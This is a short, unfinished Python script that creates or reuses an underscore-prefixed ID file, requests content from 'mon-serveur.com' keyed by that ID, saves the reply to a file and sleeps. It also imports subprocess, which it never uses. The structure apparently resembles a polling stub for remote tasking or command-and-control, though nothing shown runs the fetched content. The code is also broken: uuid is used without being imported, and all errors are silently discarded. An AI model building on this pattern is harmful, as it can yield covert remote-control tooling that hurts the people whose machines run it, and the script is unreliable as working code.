import pathlib
from time import sleep
import requests
import subprocess
import os

fichiers = [f for f in pathlib.Path.cwd().glob("_*") if f.is_file()]
        
if fichiers:
    n_feti_c = fichiers[0].name
else:
    n_feti_c = f"_{uuid.uuid4().hex}.txt"
    open(n_feti_c, "x").close()
        
na_wiout_extt = n_feti_c.partition(":")[0]
url_serveur = "https://mon-serveur.com/fichiers/"
url = url_serveur + na_wiout_extt

def recuperer_fichier():
    
    try:
        response = requests.get(url, timeout=30)
        response.raise_for_status()

        with open("letsnowathewonts.txt", "x") as f:
            f.write(response.text)
        sleep(75)
    except:
        return None
       
    